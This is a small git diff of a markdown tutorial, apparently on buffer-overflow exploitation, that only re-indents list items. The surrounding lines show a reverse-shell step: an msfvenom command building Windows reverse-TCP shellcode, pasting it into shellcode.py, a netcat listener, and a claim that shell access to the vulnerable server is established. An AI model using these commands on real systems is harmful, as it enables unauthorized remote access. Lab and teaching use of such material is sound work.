@@ -836,11 +836,11 @@ It’s basically a wrapper around the OpenAI API.
     ```
 
   - Nighth Step is shell code method using shell code method:
-   - first we have to create shell code using msfvenom(metasploit)
+    - first we have to create shell code using msfvenom(metasploit)
     ```console 
         msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
     ```
-   - copy that shell code and paste that code into the shellcode.py
+    - copy that shell code and paste that code into the shellcode.py
     ```console 
         pluma shellcode.py
       //we will run the Netcat command to listen on port in another terminal
@@ -848,7 +848,7 @@ It’s basically a wrapper around the OpenAI API.
         chmod +x shellcode.py (in first terminal)
         ./shellcode.py
     ```       
-   - in listening port terminal shell access to the target vulnerable server has been established
+    - in listening port terminal shell access to the target vulnerable server has been established
 </detals>
 
 
